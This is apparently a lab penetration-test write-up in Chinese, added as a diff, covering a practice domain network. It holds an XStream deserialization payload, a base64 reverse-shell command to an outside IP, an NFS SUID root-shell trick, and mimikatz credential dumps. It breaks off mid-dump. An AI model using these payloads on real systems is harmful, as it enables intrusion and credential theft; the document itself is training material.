@@ -1,0 +1,686 @@
+<html>
+<body>
+<!--StartFragment--><!-- obsidian --><p>这个靶子总体来说还挺简单，主要是有hint吧</p>
+<h1 data-heading="外网">外网</h1>
+<pre><code class="language-zsh">┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# fscan -h 39.98.107.183
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &#x3C;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+39.98.107.183:22 open
+39.98.107.183:80 open
+39.98.107.183:21 open
+39.98.107.183:8080 open
+[*] alive ports len is: 4
+start vulscan
+[*] WebTitle http://39.98.107.183      code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
+[+] ftp 39.98.107.183:21:anonymous
+   [->]1.txt
+   [->]pom.xml
+[*] WebTitle http://39.98.107.183:8080 code:200 len:3655   title:公司发货单
+</code></pre>
+<p>21匿名访问</p>
+<p><strong>pom.xml</strong></p>
+<pre><code class="language-xml">&#x3C;?xml version="1.0" encoding="UTF-8"?>
+&#x3C;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
+    &#x3C;modelVersion>4.0.0&#x3C;/modelVersion>
+    &#x3C;parent>
+        &#x3C;groupId>org.springframework.boot&#x3C;/groupId>
+        &#x3C;artifactId>spring-boot-starter-parent&#x3C;/artifactId>
+        &#x3C;version>2.7.2&#x3C;/version>
+        &#x3C;relativePath/> &#x3C;!-- lookup parent from repository -->
+    &#x3C;/parent>
+    &#x3C;groupId>com.example&#x3C;/groupId>
+    &#x3C;artifactId>ezjava&#x3C;/artifactId>
+    &#x3C;version>0.0.1-SNAPSHOT&#x3C;/version>
+    &#x3C;name>ezjava&#x3C;/name>
+    &#x3C;description>ezjava&#x3C;/description>
+    &#x3C;properties>
+        &#x3C;java.version>1.8&#x3C;/java.version>
+    &#x3C;/properties>
+    &#x3C;dependencies>
+        &#x3C;dependency>
+            &#x3C;groupId>org.springframework.boot&#x3C;/groupId>
+            &#x3C;artifactId>spring-boot-starter-thymeleaf&#x3C;/artifactId>
+        &#x3C;/dependency>
+        &#x3C;dependency>
+            &#x3C;groupId>org.springframework.boot&#x3C;/groupId>
+            &#x3C;artifactId>spring-boot-starter-web&#x3C;/artifactId>
+        &#x3C;/dependency>
+
+        &#x3C;dependency>
+            &#x3C;groupId>org.springframework.boot&#x3C;/groupId>
+            &#x3C;artifactId>spring-boot-starter-test&#x3C;/artifactId>
+            &#x3C;scope>test&#x3C;/scope>
+        &#x3C;/dependency>
+
+        &#x3C;dependency>
+            &#x3C;groupId>com.thoughtworks.xstream&#x3C;/groupId>
+            &#x3C;artifactId>xstream&#x3C;/artifactId>
+            &#x3C;version>1.4.16&#x3C;/version>
+        &#x3C;/dependency>
+
+        &#x3C;dependency>
+            &#x3C;groupId>commons-collections&#x3C;/groupId>
+            &#x3C;artifactId>commons-collections&#x3C;/artifactId>
+            &#x3C;version>3.2.1&#x3C;/version>
+        &#x3C;/dependency>
+    &#x3C;/dependencies>
+
+    &#x3C;build>
+        &#x3C;plugins>
+            &#x3C;plugin>
+                &#x3C;groupId>org.springframework.boot&#x3C;/groupId>
+                &#x3C;artifactId>spring-boot-maven-plugin&#x3C;/artifactId>
+            &#x3C;/plugin>
+        &#x3C;/plugins>
+    &#x3C;/build>
+
+&#x3C;/project>
+</code></pre>
+<p>xstream1.4.16版本，这个版本有<strong>CVE-2021-29505</strong><br>
+<a href="https://www.freebuf.com/vuls/286739.html" class="external-link" target="_blank" rel="noopener nofollow" aria-label="https://www.freebuf.com/vuls/286739.html" data-tooltip-position="top">XStream反序列化命令执行漏洞复现（CVE-2021-29505） - FreeBuf网络安全行业门户</a><br>
+直接按着复现就行了</p>
+<pre><code class="language-bash">
+root@VM-8-5-ubuntu:~# java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsColl
+ections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMTEuMTU5LjE3NS4yMS8yMzMyIDA+JjE=}|{base64,-d}|{bash,-i}"
+* Opening JRMP listener on 1099
+  
+root@VM-8-5-ubuntu:~# nc -lvnp 2332
+Listening on 0.0.0.0 2332
+</code></pre>
+<pre><code>POST /just_sumbit_it HTTP/1.1
+Host: 39.98.107.183:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: application/xml, text/xml, */*; q=0.01
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/xml;charset=utf-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 3119
+Origin: http://39.98.107.183:8080
+Connection: keep-alive
+Referer: http://39.98.107.183:8080/
+Priority: u=0
+
+
+&#x3C;java.util.PriorityQueue serialization='custom'>
+    &#x3C;unserializable-parents/>
+    &#x3C;java.util.PriorityQueue>
+        &#x3C;default>
+            &#x3C;size>2&#x3C;/size>
+        &#x3C;/default>
+        &#x3C;int>3&#x3C;/int>
+        &#x3C;javax.naming.ldap.Rdn_-RdnEntry>
+            &#x3C;type>12345&#x3C;/type>
+            &#x3C;value class='com.sun.org.apache.xpath.internal.objects.XString'>
+                &#x3C;m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content&#x3C;/m__obj>
+            &#x3C;/value>
+        &#x3C;/javax.naming.ldap.Rdn_-RdnEntry>
+        &#x3C;javax.naming.ldap.Rdn_-RdnEntry>
+            &#x3C;type>12345&#x3C;/type>
+            &#x3C;value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
+                &#x3C;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
+                    &#x3C;parsedMessage>true&#x3C;/parsedMessage>
+                    &#x3C;soapVersion>SOAP_11&#x3C;/soapVersion>
+                    &#x3C;bodyParts/>
+                    &#x3C;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
+                        &#x3C;attachmentsInitialized>false&#x3C;/attachmentsInitialized>
+                        &#x3C;nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
+                            &#x3C;aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
+                                &#x3C;candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
+                                    &#x3C;names>
+                                        &#x3C;string>aa&#x3C;/string>
+                                        &#x3C;string>aa&#x3C;/string>
+                                    &#x3C;/names>
+                                    &#x3C;ctx>
+                                        &#x3C;environment/>
+                                        &#x3C;registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
+                                            &#x3C;java.rmi.server.RemoteObject>
+                                                &#x3C;string>UnicastRef&#x3C;/string>
+                                                &#x3C;string>211.159.175.21&#x3C;/string>
+                                                &#x3C;int>1099&#x3C;/int>
+                                                &#x3C;long>0&#x3C;/long>
+                                                &#x3C;int>0&#x3C;/int>
+                                                &#x3C;long>0&#x3C;/long>
+                                                &#x3C;short>0&#x3C;/short>
+                                                &#x3C;boolean>false&#x3C;/boolean>
+                                            &#x3C;/java.rmi.server.RemoteObject>
+                                        &#x3C;/registry>
+                                        &#x3C;host>211.159.175.21&#x3C;/host>
+                                        &#x3C;port>1099&#x3C;/port>
+                                    &#x3C;/ctx>
+                                &#x3C;/candidates>
+                            &#x3C;/aliases>
+                        &#x3C;/nullIter>
+                    &#x3C;/sm>
+                &#x3C;/message>
+            &#x3C;/value>
+        &#x3C;/javax.naming.ldap.Rdn_-RdnEntry>
+    &#x3C;/java.util.PriorityQueue>
+&#x3C;/java.util.PriorityQueue>
+</code></pre>
+<p>发包即可</p>
+<h1 data-heading="内网">内网</h1>
+<pre><code class="language-bash">root@ubuntu:~# fscan -h 172.22.13.14/24
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &#x3C;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+(icmp) Target 172.22.13.14    is alive
+(icmp) Target 172.22.13.6     is alive
+(icmp) Target 172.22.13.28    is alive
+(icmp) Target 172.22.13.57    is alive
+[*] Icmp alive hosts len is: 4
+172.22.13.14:21 open
+172.22.13.14:8080 open
+172.22.13.28:8000 open
+172.22.13.28:3306 open
+172.22.13.28:445 open
+172.22.13.6:445 open
+172.22.13.6:139 open
+172.22.13.28:139 open
+172.22.13.28:135 open
+172.22.13.57:80 open
+172.22.13.28:80 open
+172.22.13.57:22 open
+172.22.13.14:80 open
+172.22.13.14:22 open
+172.22.13.6:135 open
+172.22.13.6:88 open
+[*] alive ports len is: 16
+start vulscan
+[*] WebTitle http://172.22.13.57       code:200 len:4833   title:Welcome to CentOS
+[*] WebTitle http://172.22.13.28       code:200 len:2525   title:欢迎登录OA办公平台
+[*] NetInfo
+[*]172.22.13.6
+   [->]WIN-DC
+   [->]172.22.13.6
+[*] NetInfo
+[*]172.22.13.28
+   [->]WIN-HAUWOLAO
+   [->]172.22.13.28
+[*] NetBios 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393
+[*] WebTitle http://172.22.13.14       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
+[*] WebTitle http://172.22.13.14:8080  code:200 len:3655   title:公司发货单
+[*] NetBios 172.22.13.6     [+] DC:XIAORANG\WIN-DC
+[*] WebTitle http://172.22.13.28:8000  code:200 len:170    title:Nothing Here.
+[+] ftp 172.22.13.14:21:anonymous
+   [->]1.txt
+   [->]pom.xml
+[+] mysql 172.22.13.28:3306:root 123456
+</code></pre>
+
+IP | 主机名 | 域信息 | 系统版本 | 角色判断/备注 | 开放端口 | Web / 服务信息
+-- | -- | -- | -- | -- | -- | --
+172.22.13.6 | WIN-DC | DC:XIAORANG\WIN-DC | - | 域控制器（DC） | 88, 135, 139, 445 | -
+172.22.13.28 | WIN-HAUWOLAO | WIN-HAUWOLAO.xiaorang.lab | Windows Server 2016 Datacenter 14393 | Windows Server / OA / MySQL | 80, 135, 139, 445, 3306, 8000 | http://172.22.13.28 → 欢迎登录OA办公平台  http://172.22.13.28:8000 → Nothing Here.  MySQL 弱口令：172.22.13.28:3306 root / 123456
+172.22.13.57 | - | - | - | CentOS Web 服务器 | 22, 80 | http://172.22.13.57 → Welcome to CentOS
+
+
+<h2 data-heading="分析">分析</h2>
+<h3 data-heading="172.22.13.28">172.22.13.28</h3>
+<p>mysql有弱密码，可以试着打udf</p>
+<p><strong>UDF指的是用户自定义函数，用户可以对数据库所使用的函数进行一个扩展（利用dll文件），从而定制一些符合自己需求的函数，但是同样的，当黑客获取了数据库的root用户的一个权限时，即使所在的系统权限很低，也可以使用UDF来自定义一个执行系统命令的函数，但是执行权限为管理员权限，从而可以用来添加管理员账户，远程连接。</strong></p>
+<p><strong>mysql版本>5.1 需要在mysql的安装目录下创建 <code>lib\plugin</code> 这个文件夹（默认不存在），之后将把dll文件放在这个文件夹中； </strong><br>
+<strong>mysql版本&#x3C;5.1 需要将dll文件放在 <code>C:\windows\</code>或<code>C:\windows\system32</code>。</strong></p>
+<h3 data-heading="172.22.13.57">172.22.13.57</h3>
+<p><strong>为了实现跨机器和跨操作系统的文件共享，管理员在内网部署了 NFS，然而这个决策却使得该服务器陷入了潜在的安全风险。你的任务是尝试获取该服务器的控制权，以评估安全性。</strong></p>
+<p>hint是nfs，nfs端口是2049</p>
+<h2 data-heading="hacking">hacking</h2>
+<h3 data-heading="nfs">nfs</h3>
+<pre><code class="language-zsh">root@ubuntu:~# fscan -h 172.22.13.14/24 -p 2049
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &#x3C;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+(icmp) Target 172.22.13.14    is alive
+(icmp) Target 172.22.13.6     is alive
+(icmp) Target 172.22.13.28    is alive
+(icmp) Target 172.22.13.57    is alive
+[*] Icmp alive hosts len is: 4
+172.22.13.57:2049 open
+</code></pre>
+<p>列出共享目录+挂载</p>
+<pre><code class="language-bash">root@ubuntu:~# mkdir /mnt/nfs
+root@ubuntu:~# mount -t nfs 172.22.13.57:/home/joyce /mnt/nfs -o nolock
+root@ubuntu:~# ls -al /mnt/nfs/
+total 24
+drwx------ 2  996  994 4096 Aug 11  2022 .
+drwxr-xr-x 3 root root 4096 Sep 22 18:22 ..
+-rw------- 1  996  994    5 Aug 11  2022 .bash_history
+-rw-r--r-- 1  996  994   18 Nov 25  2021 .bash_logout
+-rw-r--r-- 1  996  994  193 Nov 25  2021 .bash_profile
+-rw-r--r-- 1  996  994  231 Nov 25  2021 .bashrc
+</code></pre>
+<p>公钥权限设置好<br>
+UID/GID ：996/994</p>
+<pre><code class="language-bash">cd /mnt/nfs
+chown -R 996:994 .ssh
+chmod 700 .ssh
+chmod 600 .ssh/authorized_keys
+</code></pre>
+<p>后面cp个bash过来，因为nfs按用户名还是uid来着判断用户，所以会把外网的root当本地root，加一下s位直接提权即可</p>
+<pre><code class="language-bash">cp /bin/bash /home/joyce/rootbash
+chmod 4755 /mnt/nfs/rootbash
+./rootbash -p
+</code></pre>
+<pre><code class="language-bash">[joyce@centos ~]$ cat /pAss.txt
+xiaorang.lab/zhangwen\QT62f3gBhK1
+</code></pre>
+<h3 data-heading="mysql">mysql</h3>
+<p>上面拿到了一个域用户的凭据，可以rdp到这台机器，这里udf的时候失败了，因为没有插件目录，但是zhangwen有权限写，建一个即可</p>
+<p>这里mdut测试连接会失败，这个服务很卡，得等半天响应</p><!--EndFragment-->
+
+<img width="966" height="745" alt="Image" src="https://github.com/user-attachments/assets/9b787eec-2d0e-4bef-b60f-015b76784f6e" />
+
+<img width="1246" height="787" alt="Image" src="https://github.com/user-attachments/assets/d47c90f0-02e8-43e6-8d66-1016e8d1c379" />
+<h3 data-heading="mysql">DC</h3>
+
+这里我用SharpHound分析的域环境没法导入bloodhound，可能是版本不匹配？
+
+```zsh
+┌──(.venv3)─(root㉿MJ)-[/tmp/test/goad/BloodHound.py]
+└─# pc -q python3 bloodhound.py -u zhangwen -p QT62f3gBhK1 -d xiaorang.lab -dc WIN-DC.xiaorang.lab -c all --dns-tcp -ns 172.22.13.6 --zip
+```
+
+<img width="1746" height="1100" alt="Image" src="https://github.com/user-attachments/assets/32b4c18c-a246-42b5-aadb-419fdd6f2dbd" />
+可以看到chenglei这个用户对域内用户有writedacl权限，可以给zhangwen DCsync权限，然后dump全域hash，接下来拿到chenglei权限即可
+
+在mysql机器上，有chenglei的家目录，所以mimikatz抓hash
+
+```zsh
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+476	{0;000003e7} 1 D 18940     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
+ -> Impersonated !
+ * Process Token : {0;000003e7} 0 D 11291103  	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,28p)	Primary
+ * Thread Token  : {0;000003e7} 1 D 11336209  	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 9610327 (00000000:0092a457)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2026/9/22 18:53:27
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : XIAORANG
+	 * NTLM     : 025c40a0a6deeb361b4ad5da2816ce42
+	 * SHA1     : 81c0c8e4b65920dd81b955a171cb60e567fd3bd1
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : xiaorang.lab
+	 * Password : 67 c0 d3 cb 67 ac a6 41 f1 4a 38 8a 5d f4 dd 70 be 23 41 49 1a 5a e8 51 6b 7e 25 18 34 a5 eb 76 ae e6 7a 10 2e 8c 49 28 ca c4 1f 9c 2a 22 e9 0d dd 19 83 d5 06 bc a1 15 7b e0 6d ed 24 94 98 a4 2a f8 76 f2 57 f9 e4 ee aa c5 3d d8 bc 29 e5 60 35 bd e5 35 20 41 0f a1 56 5f 23 70 92 91 e2 a2 46 49 a0 26 d1 fb 27 d7 1e 07 57 ab 7f d5 4b f9 e7 4b 33 7b fd 46 2d e1 d3 b1 1c 6c dc f6 54 da ce d6 b3 f4 c8 ab 86 5e 99 12 35 46 8f 33 46 0c 3f ba 48 a6 b2 83 06 95 23 c2 40 b1 e4 57 72 7c 68 96 9f 4a 59 59 54 d4 74 f7 33 c6 8b 74 50 aa 31 33 98 b5 47 b6 b7 fc 82 c4 e7 fc 56 e5 1a b2 2e 5d 4e dc 96 81 cb fe e2 fc a7 e6 2d 66 58 ee 07 c5 00 11 87 af 6e 9c 46 f1 0f 37 af 46 90 b5 9a 04 93 63 e9 13 0e 51 d9 86 a3 88 6b 8b 3d f9 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 210741 (00000000:00033735)
+Session           : Service from 0
+User Name         : chenglei
+Domain            : XIAORANG
+Logon Server      : WIN-DC
+Logon Time        : 2026/9/22 18:00:12
+SID               : S-1-5-21-3269458654-3569381900-10559451-1105
+	msv :	
+	 [00000003] Primary
+	 * Username : chenglei
+	 * Domain   : XIAORANG
+	 * NTLM     : 0c00801c30594a1b8eaa889d237c5382
+	 * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7
+	 * DPAPI    : 89b179dc738db098372c365602b7b0f4
+	tspkg :	
+	wdigest :	
+	 * Username : chenglei
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : chenglei
+	 * Domain   : XIAORANG.LAB
+	 * Password : Xt61f3LBhg1
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 52730 (00000000:0000cdfa)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2026/9/22 18:00:06
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : XIAORANG
+	 * NTLM     : b5cd3591a58e1169186bcdbfd4b6322d
+	 * SHA1     : 226ee6b5e527e5903988f08993a2456e3297ee1f
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : xiaorang.lab
+	 * Password : `k+hcEDFvtzoObj=>DvzxiNqwyEn;Eu-\zFVAh>.G0u%BqQ21FskHtJlW4)3is3V;7Iu)3B00kd1##IB'LLG6wSx6TR%m;`Nfr;;Hf8O'Szfl0Z=w+^,>0jR
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WIN-HAUWOLAO$
+Domain            : XIAORANG
+Logon Server      : (null)
+Logon Time        : 2026/9/22 18:00:06
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : XIAORANG
+	 * NTLM     : 025c40a0a6deeb361b4ad5da2816ce42
+	 * SHA1     : 81c0c8e4b65920dd81b955a171cb60e567fd3bd1
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : win-hauwolao$
+	 * Domain   : XIAORANG.LAB
+	 * Password : 67 c0 d3 cb 67 ac a6 41 f1 4a 38 8a 5d f4 dd 70 be 23 41 49 1a 5a e8 51 6b 7e 25 18 34 a5 eb 76 ae e6 7a 10 2e 8c 49 28 ca c4 1f 9c 2a 22 e9 0d dd 19 83 d5 06 bc a1 15 7b e0 6d ed 24 94 98 a4 2a f8 76 f2 57 f9 e4 ee aa c5 3d d8 bc 29 e5 60 35 bd e5 35 20 41 0f a1 56 5f 23 70 92 91 e2 a2 46 49 a0 26 d1 fb 27 d7 1e 07 57 ab 7f d5 4b f9 e7 4b 33 7b fd 46 2d e1 d3 b1 1c 6c dc f6 54 da ce d6 b3 f4 c8 ab 86 5e 99 12 35 46 8f 33 46 0c 3f ba 48 a6 b2 83 06 95 23 c2 40 b1 e4 57 72 7c 68 96 9f 4a 59 59 54 d4 74 f7 33 c6 8b 74 50 aa 31 33 98 b5 47 b6 b7 fc 82 c4 e7 fc 56 e5 1a b2 2e 5d 4e dc 96 81 cb fe e2 fc a7 e6 2d 66 58 ee 07 c5 00 11 87 af 6e 9c 46 f1 0f 37 af 46 90 b5 9a 04 93 63 e9 13 0e 51 d9 86 a3 88 6b 8b 3d f9 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 9633008 (00000000:0092fcf0)
+Session           : RemoteInteractive from 2
+User Name         : zhangwen
+Domain            : XIAORANG
+Logon Server      : WIN-DC
+Logon Time        : 2026/9/22 18:53:27
+SID               : S-1-5-21-3269458654-3569381900-10559451-1104
+	msv :	
+	 [00000003] Primary
+	 * Username : zhangwen
+	 * Domain   : XIAORANG
+	 * NTLM     : fa7d776fdfc82d3f43c9d8b7f5312d77
+	 * SHA1     : 3e568ea10e85b91f95af47b064b713f83682d1ee
+	 * DPAPI    : 4b3a5a99aa46e26e47ff5fbe2c7e58b4
+	tspkg :	
+	wdigest :	
+	 * Username : zhangwen
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : zhangwen
+	 * Domain   : XIAORANG.LAB
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 9610348 (00000000:0092a46c)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2026/9/22 18:53:27
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : XIAORANG
+	 * NTLM     : 025c40a0a6deeb361b4ad5da2816ce42
+	 * SHA1     : 81c0c8e4b65920dd81b955a171cb60e567fd3bd1
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : xiaorang.lab
+	 * Password : 67 c0 d3 cb 67 ac a6 41 f1 4a 38 8a 5d f4 dd 70 be 23 41 49 1a 5a e8 51 6b 7e 25 18 34 a5 eb 76 ae e6 7a 10 2e 8c 49 28 ca c4 1f 9c 2a 22 e9 0d dd 19 83 d5 06 bc a1 15 7b e0 6d ed 24 94 98 a4 2a f8 76 f2 57 f9 e4 ee aa c5 3d d8 bc 29 e5 60 35 bd e5 35 20 41 0f a1 56 5f 23 70 92 91 e2 a2 46 49 a0 26 d1 fb 27 d7 1e 07 57 ab 7f d5 4b f9 e7 4b 33 7b fd 46 2d e1 d3 b1 1c 6c dc f6 54 da ce d6 b3 f4 c8 ab 86 5e 99 12 35 46 8f 33 46 0c 3f ba 48 a6 b2 83 06 95 23 c2 40 b1 e4 57 72 7c 68 96 9f 4a 59 59 54 d4 74 f7 33 c6 8b 74 50 aa 31 33 98 b5 47 b6 b7 fc 82 c4 e7 fc 56 e5 1a b2 2e 5d 4e dc 96 81 cb fe e2 fc a7 e6 2d 66 58 ee 07 c5 00 11 87 af 6e 9c 46 f1 0f 37 af 46 90 b5 9a 04 93 63 e9 13 0e 51 d9 86 a3 88 6b 8b 3d f9 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 210742 (00000000:00033736)
+Session           : Service from 0
+User Name         : chenglei
+Domain            : XIAORANG
+Logon Server      : WIN-DC
+Logon Time        : 2026/9/22 18:00:12
+SID               : S-1-5-21-3269458654-3569381900-10559451-1105
+	msv :	
+	 [00000003] Primary
+	 * Username : chenglei
+	 * Domain   : XIAORANG
+	 * NTLM     : 0c00801c30594a1b8eaa889d237c5382
+	 * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7
+	 * DPAPI    : 89b179dc738db098372c365602b7b0f4
+	tspkg :	
+	wdigest :	
+	 * Username : chenglei
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : chenglei
+	 * Domain   : XIAORANG.LAB
+	 * Password : Xt61f3LBhg1
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2026/9/22 18:00:06
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 52711 (00000000:0000cde7)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2026/9/22 18:00:06
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : XIAORANG
+	 * NTLM     : 025c40a0a6deeb361b4ad5da2816ce42
+	 * SHA1     : 81c0c8e4b65920dd81b955a171cb60e567fd3bd1
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : xiaorang.lab
+	 * Password : 67 c0 d3 cb 67 ac a6 41 f1 4a 38 8a 5d f4 dd 70 be 23 41 49 1a 5a e8 51 6b 7e 25 18 34 a5 eb 76 ae e6 7a 10 2e 8c 49 28 ca c4 1f 9c 2a 22 e9 0d dd 19 83 d5 06 bc a1 15 7b e0 6d ed 24 94 98 a4 2a f8 76 f2 57 f9 e4 ee aa c5 3d d8 bc 29 e5 60 35 bd e5 35 20 41 0f a1 56 5f 23 70 92 91 e2 a2 46 49 a0 26 d1 fb 27 d7 1e 07 57 ab 7f d5 4b f9 e7 4b 33 7b fd 46 2d e1 d3 b1 1c 6c dc f6 54 da ce d6 b3 f4 c8 ab 86 5e 99 12 35 46 8f 33 46 0c 3f ba 48 a6 b2 83 06 95 23 c2 40 b1 e4 57 72 7c 68 96 9f 4a 59 59 54 d4 74 f7 33 c6 8b 74 50 aa 31 33 98 b5 47 b6 b7 fc 82 c4 e7 fc 56 e5 1a b2 2e 5d 4e dc 96 81 cb fe e2 fc a7 e6 2d 66 58 ee 07 c5 00 11 87 af 6e 9c 46 f1 0f 37 af 46 90 b5 9a 04 93 63 e9 13 0e 51 d9 86 a3 88 6b 8b 3d f9 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 24238 (00000000:00005eae)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2026/9/22 18:00:05
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : XIAORANG
+	 * NTLM     : 025c40a0a6deeb361b4ad5da2816ce42
+	 * SHA1     : 81c0c8e4b65920dd81b955a171cb60e567fd3bd1
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WIN-HAUWOLAO$
+Domain            : XIAORANG
+Logon Server      : (null)
+Logon Time        : 2026/9/22 18:00:05
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-HAUWOLAO$
+	 * Domain   : XIAORANG
+	 * Password : (null)
+	kerberos :	
+	 * Username : win-hauwolao$
+	 * Domain   : XIAORANG.LAB
